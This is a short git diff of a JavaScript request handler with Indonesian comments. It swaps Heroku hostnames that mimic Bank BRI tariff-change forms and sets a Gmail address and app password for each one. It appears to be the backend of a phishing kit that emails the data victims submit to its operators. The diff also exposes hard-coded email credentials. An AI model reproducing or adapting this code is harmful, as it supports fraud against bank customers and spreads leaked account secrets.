@@ -7,16 +7,16 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
 
-    if(url == 'pilih-tarif-bri.herokuapp.com') //jika url sama dengan url hosting
+    if(url == 'perubahan-tarifbrimo.herokuapp.com') //jika url sama dengan url hosting
     {
 
-        email = 'semogasaja539@gmail.com'; //email
-        pass = 'nnxpdsaataxbulwe'; //sandi aplikasi dari verifikasi 2 langkah
+        email = 'besarhasil47@gmail.com'; //email
+        pass = 'srpjniuzjggqmomn'; //sandi aplikasi dari verifikasi 2 langkah
         
-    } else if(url == 'formulirtarifbankbri.herokuapp.com') //jika url sama dengan url hosting
+    } else if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
     {
-        email = 'semoga5151@gmail.com'; //email
-        pass = 'wsmczuwttfklfcol'; //sandi aplikasi dari verifikasi 2 langkah
+        email = 'suksesk541@gmail.com'; //email
+        pass = 'stpqngfmwfvsjbqh'; //sandi aplikasi dari verifikasi 2 langkah
     }
     else {
 
